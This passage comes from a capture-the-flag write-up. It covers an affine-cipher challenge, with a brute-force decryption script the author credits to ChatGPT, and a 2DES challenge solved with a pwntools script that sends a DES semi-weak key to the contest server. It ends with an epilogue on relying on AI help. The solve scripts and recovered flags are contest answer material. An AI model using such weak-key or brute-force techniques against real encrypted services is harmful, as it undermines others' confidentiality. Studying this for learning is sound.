print(enc)

# Output
# o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"
```

Actually, the exploit is totally generated by ChatGPT. But I'll read the code for better understanding. (Crypto is just difficult lol)  

```python
import string
from sympy import mod_inverse

# 給定的加密文本與 charset
enc = r'o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"'
charset = string.digits + string.ascii_letters + string.punctuation
N = len(charset)

# 假設的 A 和 B (需要從密文中計算)
# 嘗試暴力破解 A 和 B


def decrypt(enc, A, B):
    A_inv = mod_inverse(A, N)
    dec = "".join(charset[(A_inv * (charset.find(c) - B)) % N] for c in enc)
    return dec


# 嘗試暴力破解 A 和 B
for A in range(1, N):
    try:
        A_inv = mod_inverse(A, N)
    except ValueError:
        continue  # A 不是可逆的，跳過
    for B in range(N):
        flag = decrypt(enc, A, B)
        if flag.startswith("TSC{"):
            print(f"[+] Flag found: {flag}")
            exit()

print("[-] Flag not found!")
```

```txt
TSC{c14551c5_c1ph3r5_4r5_fr4g17e}
```

## 2DES

Source first.

```python
#!/usr/bin/env python
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad
from random import choice
from os import urandom
from time import sleep


def encrypt(msg: bytes, key1, key2):
    des1 = DES.new(key1, DES.MODE_ECB)
    des2 = DES.new(key2, DES.MODE_ECB)
    return des2.encrypt(des1.encrypt(pad(msg, des1.block_size)))


def main():
    flag = open("/flag.txt", "r").read().strip().encode()

    print("This is a 2DES encryption service.")
    print("But you can only control one of the key.")
    print()

    while True:
        print("1. Encrypt flag")
        print("2. Decrypt flag")
        print("3. Exit")
        option = int(input("> "))

        if option == 1:
            # I choose a key
            # You can choose another one
            keyset = ["1FE01FE00EF10EF1", "01E001E001F101F1", "1FFE1FFE0EFE0EFE"]
            key1 = bytes.fromhex(choice(keyset))
            key2 = bytes.fromhex(input("Enter key2 (hex): ").strip())

            ciphertext = encrypt(flag, key1, key2)
            print("Here is your encrypted flag:", flush=True)
            print("...", flush=True)
            sleep(3)
            if ciphertext[:4] == flag[:4]:
                print(ciphertext)
                print("Hmmm... What a coincidence!")
            else:
                print("System error!")
            print()

        elif option == 2:
            print("Decryption are disabled")
            print()

        elif option == 3:
            print("Bye!")
            exit()

        else:
            print("Invalid option")
            print()


if __name__ == "__main__":
    main()
```

The exploit is as follows. I haven't have time to study for it to fully understand the math in the exploit, I just search the key set  shown in the challenge source code on the website, and I found the solution.

```python
# Reference: https://hackmd.io/@phucrio17/cryptohack-symmetric-ciphers

from pwn import *

r = remote("172.31.2.2", 9487)

while True:
    r.sendline(b"1")  # For encrypt flag option
    r.sendline(b"E01FE01FF10EF10E")
    res = r.recvuntil(b">").decode()
    if "error" in res.lower():
        continue
    elif "tsc" in res.lower():
        print(res)
        break
```

```txt
TSC{th3_Key_t0_br34k_DES_15_tHe_keY}
```

# Epilogue

Although I've got the 3rd prize in this contest (on the qualified scoreboard), I think I still have a lot to learn. I obviously don't understand every challenge I solved in this contest, but I will check others' writeups to make sure that I can fully understand the exploit under the hood. Hope one day I can write exploits without AI's help and know more about cryptography and binaries. 

This time I only solved 1 pwn challenge and 80% of the crypto challenges are solved with AI's help, I wish I can do better next time. 

Hack the planet!!! 🧛  

